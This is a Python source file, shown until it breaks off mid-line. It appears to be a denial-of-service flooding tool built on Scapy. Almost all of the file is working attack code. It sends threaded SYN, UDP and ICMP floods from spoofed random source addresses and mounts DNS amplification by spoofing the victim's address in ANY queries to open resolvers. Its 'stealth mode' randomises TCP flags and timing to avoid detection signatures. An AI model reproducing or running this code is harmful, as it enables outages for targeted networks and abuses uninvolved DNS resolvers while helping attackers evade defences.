import os
import time
import random
import sys
from threading import Thread, Lock
try:
    from scapy.all import IP, TCP, UDP, ICMP, RandShort, DNS, DNSQR, send, conf
    conf.L3socket = conf.L3socket or conf.L3socket6
    conf.verb = 0  # Suppress Scapy output
except ImportError:
    print("Scapy is not installed. Please install it using: pip install scapy")
    sys.exit(1)

# Color constants
WHITE = "\033[7m"
BRIGHT_WHITE = "\033[97m"
BOLD_WHITE = "\033[1;97m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

# Logo
logo = """
\033[0;35m ███▄    █ ▓█████▄▄▄█████▓      ██▓███ ▓██    ██▓
\033[0;35m ██ ▀█    █ ▓█    ▀▓  ██▒ ▓▒      ▓██░  ██▒▒██  ██▒
\033[0;35m▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░      ▓██░ ██▓▒ ▒██ ██░
\033[0;35m▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░        ▒██▄█▓▒ ▒ ░ ▐██▓░
\033[0;35m▒██░   ▓██░░▒████▒ ▒██▒ ░  ██▓ ▒██▒ ░  ░ ░ ██▒▓░
\033[0;35m░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒▓▒ ▒▓▒░ ░  ░  ██▒▒▒
\033[0;35m░ ░░   ░ ▒░ ░ ░  ░    ░   ░▒  ░▒ ░      ▓██ ░▒░
    ░    ░ ░    ░          ░  ░░        ▒ ▒ ░░
          ░    ░ ░                  ░ ░
                                ░   ░ ░
"""

# Globals for thread-safe stats
global_packet_count = 0
global_total_bytes_sent = 0
stats_lock = Lock()
stop_attack = False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def update_stats(packet_size):
    global global_packet_count, global_total_bytes_sent
    with stats_lock:
        global_packet_count += 1
        global_total_bytes_sent += packet_size

def packet_sender_thread(target_ip, target_port, min_packet_size, max_packet_size,
                         spoofed_ips, attack_type, dns_resolvers=None,
                         stealth_mode=False, stealth_delay_range=(0, 0.01),
                         stealth_random_flags=False):
    global stop_attack
    BATCH_SIZE = 200  # Lower batch size for stealthier bursts
    packets_to_send = []

    while not stop_attack:
        src_ip = random.choice(spoofed_ips) if spoofed_ips else None
        current_payload_size = random.randint(min_packet_size, max_packet_size) if min_packet_size != max_packet_size else min_packet_size
        payload_data = os.urandom(current_payload_size)

        packet = None
        ip_layer = IP(src=src_ip, dst=target_ip)

        # Randomize TCP flags in stealth mode to avoid signature
        tcp_flags = "S"
        if stealth_mode and stealth_random_flags:
            possible_flags = ['S', 'A', 'F', 'R', 'P', 'SA', 'FA', 'PA']
            tcp_flags = random.choice(possible_flags)

        if attack_type == 'SYN':
            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags=tcp_flags, seq=random.randint(1000, 99999))
            packet = ip_layer / tcp_layer / payload_data
        elif attack_type == 'UDP':
            udp_layer = UDP(sport=RandShort(), dport=target_port)
            packet = ip_layer / udp_layer / payload_data
        elif attack_type == 'ICMP':
            icmp_layer = ICMP(type=8, code=0, id=random.randint(1, 65535), seq=random.randint(1, 65535))
            packet = ip_layer / icmp_layer / payload_data
        elif attack_type == 'DNS_AMP':
            if not dns_resolvers:
                print(f"{RED}Error: DNS Amplification requires resolvers. Stopping thread.{RESET}")
                stop_attack = True
                break
            dns_query = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
            resolver_ip = random.choice(dns_resolvers)
            ip_layer_amp = IP(src=target_ip, dst=resolver_ip)
            udp_layer_amp = UDP(sport=RandShort(), dport=53)
            packet = ip_layer_amp / udp_layer_amp / dns_query

        if packet:
            packets_to_send.append(packet)

            if len(packets_to_send) >= BATCH_SIZE:
                try:
                    send(packets_to_send, verbose=0)
                    for p in packets_to_send:
                        update_stats(len(p))
                except Exception:
                    pass
                packets_to_send = []

            # Stealth mode: add small random delay between batches
            if stealth_mode:
                time.sleep(random.uniform(*stealth_delay_range))

    # Send remaining packets
    if packets_to_send:
        try:
            send(packets_to_send, verbose=0)
            for p in packets_to_send:
                update_stats(len(p))
        except Exception:
            pass

def start_flood(target_ip, target_port, min_packet_size, max_packet_size,
                spoof_ip_choice, attack_type, num_threads, dns_resolvers=None,
                stealth_mode=False, stealth_delay_min=0.001, stealth_delay_max=0.01,
                stealth_random_flags=False):
    global global_packet_count, global_total_bytes_sent, stop_attack
    global_packet_count = 0
    global_total_bytes_sent = 0
    stop_attack = False

    try:
        clear_screen()
        print(f"{RED}--- Initiating {attack_type} Flood ---{RESET}")
        print("====================================")
        print(f"Target:             {target_ip}{f':{target_port}' if attack_type != 'DNS_AMP' else ''}")
        if attack_type == 'DNS_AMP':
            print(f"DNS Resolvers:      {len(dns_resolvers)} loaded")
            print(f"Victim IP (Spoofed Source): {target_ip}")
            print(f"Attack Type:        DNS Amplification (Target: {target_ip})")
        else:
            print(f"Payload Size Range: {min_packet_size} - {max_packet_size} bytes")
        print(f"Spoofing Source IP: {GREEN}ENABLED{RESET}" if spoof_ip_choice.lower() == 'y' else f"Spoofing Source IP: {YELLOW}DISABLED (Using Real IP){RESET}")
        print(f"Number of Threads:  {num_threads}")
        if stealth_mode:
            print(f"{YELLOW}Stealth Mode: ENABLED{RESET}")
            print(f"Stealth Delay Range: {stealth_delay_min:.4f}s to {stealth_delay_max:.4f}s")
            print(f"Random TCP Flags: {'Yes' if stealth_random_flags else 'No'}")
        else:
            print(f"Stealth Mode: DISABLED")
        print("\nThis will send packets as fast as possible (unless stealth mode is enabled).")
        print("====================================")
        print("Live Stats")

        spoofed_ips = []
        if spoof_ip_choice.lower() == 'y' or attack_type == 'DNS_AMP':
            print(f"{YELLOW}Generating spoofed IPs...{RESET}")
            spoofed_ips = [generate_random_ip() for _ in range(10000)]
            print(f"{YELLOW}Pre-generated {len(spoofed_ips)} spoofed IPs.{RESET}")
            time.sleep(1)

        threads = []
        for _ in range(num_threads):
            thread = Thread(target=packet_sender_thread, args=(
                target_ip, target_port, min_packet_size, max_packet_size,
                spoofed_ips, attack_type, dns_resolvers,
                stealth_mode, (stealth_delay_min, stealth_delay_max), stealth_random_flags
            ))
            threads.append(thread)
            thread.daemon = True
            thread.start()

        interval_start_time = time.time()
        reporting_interval = 0.5

        while not stop_attack:
            current_time = time.time()
            elapsed_interval_time = current_time - interval_start_time

            if elapsed_interval_time >= reporting_interval:
                with stats_lock:
                    current_packet_count = global_packet_count
                    current_total_bytes_sent = global_total_bytes_sent
                    global_packet_count = 0
                    global_total_bytes_sent = 0

                if current_packet_count > 0:
                    bits_sent = (current_total_bytes_sent * 8)
                    mbps = (bits_sent / elapsed_interval_time) / 1_000_000 if elapsed_interval_time > 0 else 0
                    actual_pps = current_packet_count / elapsed_interval_time if elapsed_interval_time > 0 else 0

                    sys.stdout.write(f"\r{RED}[*] Packets Sent: {current_packet_count:,} | Actual PPS: {actual_pps:,.2f} | Total Size: {current_total_bytes_sent/1024:.1f} KB | Rate: {mbps:.2f} Mbps{RESET}")
                    sys.stdout.flush()
                else:
                    sys.stdout.write(f"\r{RED}[*] Packets Sent: {current_packet_count:,} | Actual PPS: 0.00 | Total Size: 0.0 KB | Rate: 0.00 Mbps{RESET}")
                    sys.stdout.flush()

                interval_start_time = time.time()

            time.sleep(0.01)

    except KeyboardInterrupt:
        print("\n\n[!] Test stopped by user.")
    except Exception as e:
        print(f"\n
